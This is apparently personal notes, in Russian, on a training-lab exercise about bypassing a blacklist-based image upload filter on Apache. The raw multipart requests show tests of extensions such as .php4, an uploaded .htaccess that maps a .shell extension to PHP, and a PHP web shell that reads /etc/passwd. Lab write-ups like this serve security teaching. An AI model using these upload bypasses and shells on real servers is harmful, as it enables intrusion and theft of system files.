Лаборатория содержит уязвимую функцию загрузки изображения. Определенные расширения файлов включены в черный список, но эта защита может быть обойдена из -за фундаментального недостатка в конфигурации этого черного списка.

## Дано

учетные данные: `wiener:peter`

## Задача

загрузите базовую веб-оболочку PHP, а затем используйте ее для извлечения содержимого файла. `/home/carlos/secret`

# Разведка

### 1. Формат отправки
```
-----------------------------291081305612230447413769182849
Content-Disposition: form-data; name="avatar"; filename="icons8-google-chrome-200.png"
Content-Type: image/png


-----------------------------291081305612230447413769182849
Content-Disposition: form-data; name="user"

wiener
-----------------------------291081305612230447413769182849
Content-Disposition: form-data; name="csrf"

Pjod2SEEPR1snV0YWx40JSsHrwiBvtli
-----------------------------291081305612230447413769182849--
```
- Тест смены Content-Type
	text/html - 200
	application/x-httpd-php - 200
- Расширение .php не поддерживает 
- ==Сервер Apache на ubuntu==
```
Sorry, php files are not allowed
Sorry, there was an error uploading your file.<p>	
```
-  Тест расширений php
	1. ==.php4 — `The file avatars/myexplot.php4 has been uploaded.`== 
		==Ответ: <?php echo file_get_contents('/etc/passwd'); ?>==
	1. .phtml — еще одно расширение для PHP-файлов.
	2. .phar — архивы PHP, которые могут содержать исполняемый код.

#### Мини итог. 
Чёрный список не полный и пропускает расширение .php4
Сработала 2 линия защиты которая не дала выполнить код из за того что MIME-тип не был явно настроен для выполнения

### 2. Проверка на внедрения конфигурации веб-сервера

- Так как мы работаем по веб серверу `Apache/2.4.41 (Ubuntu)` то для него идёт ==расширение `.htaccess`==
```
AddType application/x-httpd-php .shell
```
указывает, что файлы с расширением .shell должны обрабатываться как PHP-файлы. 

- Ответ 200 The file avatars/.htaccess has been uploaded.

# Атака

Загружаем файл с shell расширением и получаем ключ
```

-----------------------------291081305612230447413769182849
Content-Disposition: form-data; name="avatar"; filename="myexplot.shell"
Content-Type: application/x-httpd-php

<?php echo file_get_contents('/etc/passwd'); ?>
-----------------------------291081305612230447413769182849
Content-Disposition: form-data; name="user"

wiener
-----------------------------291081305612230447413769182849
Content-Disposition: form-data; name="csrf"

Pjod2SEEPR1snV0YWx40JSsHrwiBvtli
-----------------------------291081305612230447413769182849--
```
Ответ
![[Pasted image 20250126104106.png]]
